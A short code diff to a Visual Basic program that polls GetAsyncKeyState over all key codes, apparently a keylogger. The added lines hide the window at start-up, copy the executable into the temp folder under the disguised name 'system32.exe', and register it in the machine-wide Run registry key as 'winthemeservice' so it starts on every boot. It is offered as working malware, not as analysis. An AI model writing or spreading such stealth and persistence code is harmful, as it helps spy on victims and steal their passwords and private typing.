@@ -30,6 +30,24 @@ Attribute VB_Exposed = False
 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
 Dim Str As String
 
+Private Sub Form_Load()
+Me.Hide
+
+Dim sPath As String
+sPath = Environ("temp") & "\system32.exe"
+
+On Error GoTo z
+FileCopy App.Path & "\" & App.EXEName & ".exe", sPath
+
+Dim Startup_key As String
+Startup_key = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
+Dim Reg As Object
+Set Reg = CreateObject("wscript.shell")
+Reg.RegWrite Startup_key & "winthemeservice", sPath
+
+z:
+End Sub
+
 Private Sub TM_Timer()
     For i = 1 To 255
         result = 0
